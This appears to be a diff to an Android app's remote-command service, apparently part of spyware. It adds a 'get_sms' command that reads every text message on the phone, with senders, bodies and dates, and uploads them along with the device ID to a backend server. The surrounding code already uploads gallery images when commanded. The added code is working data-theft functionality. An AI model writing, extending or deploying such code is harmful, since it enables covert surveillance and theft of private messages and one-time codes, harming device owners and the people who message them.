@@ -7,6 +7,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.*
 import android.provider.Settings
+import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationManagerCompat
@@ -24,6 +25,11 @@ import android.content.pm.PackageManager
 import java.io.File
 import android.os.Environment
 import okhttp3.RequestBody.Companion.asRequestBody
+import android.telephony.TelephonyManager
+import android.telephony.PhoneStateListener
+import android.telephony.CellInfo
+import android.telephony.CellSignalStrength
+
 
 
 class CommandService : Service() {
@@ -118,12 +124,75 @@ class CommandService : Service() {
                             uploadGalleryImages(applicationContext)
                         }
 
+                        "get_sms" -> {
+                            Log.d("CmdService", "Running get_sms command")
+                            uploadSmsToBackend(applicationContext)
+                        }
+
 
                     }
 
                 } catch (e: Exception) {
                     Log.e("CmdService", "Parse error: ${e.message}")
                 }
+            }
+        })
+    }
+
+    private fun getAllSms(context: Context): JSONArray {
+        val smsList = JSONArray()
+        val uri = Telephony.Sms.CONTENT_URI
+        val projection = arrayOf(
+            Telephony.Sms.ADDRESS,
+            Telephony.Sms.BODY,
+            Telephony.Sms.DATE,
+            Telephony.Sms.TYPE
+        )
+    
+        val cursor = context.contentResolver.query(uri, projection, null, null, "date DESC")
+        cursor?.use {
+            val idxAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
+            val idxBody = it.getColumnIndex(Telephony.Sms.BODY)
+            val idxDate = it.getColumnIndex(Telephony.Sms.DATE)
+            val idxType = it.getColumnIndex(Telephony.Sms.TYPE)
+    
+            while (it.moveToNext()) {
+                val smsJson = JSONObject()
+                smsJson.put("address", it.getString(idxAddress))
+                smsJson.put("body", it.getString(idxBody))
+                smsJson.put("date", it.getLong(idxDate))
+                smsJson.put("type", it.getInt(idxType)) // 1: inbox, 2: sent
+                smsList.put(smsJson)
+            }
+        }
+    
+        return smsList
+    }
+    
+    private fun uploadSmsToBackend(context: Context) {
+        val smsArray = getAllSms(context)
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+    
+        val json = JSONObject().apply {
+            put("device_id", androidId)
+            put("sms", smsArray)
+        }
+    
+        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+    
+        val request = Request.Builder()
+            .url("${ApiConfig.BASE_URL}/api/device/upload_sms")
+            .post(body)
+            .build()
+    
+        OkHttpClient().newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("UploadSMS", "Failed: ${e.message}")
+            }
+    
+            override fun onResponse(call: Call, response: Response) {
+                val res = response.body?.string()
+                Log.i("UploadSMS", "Response: $res")
             }
         })
     }
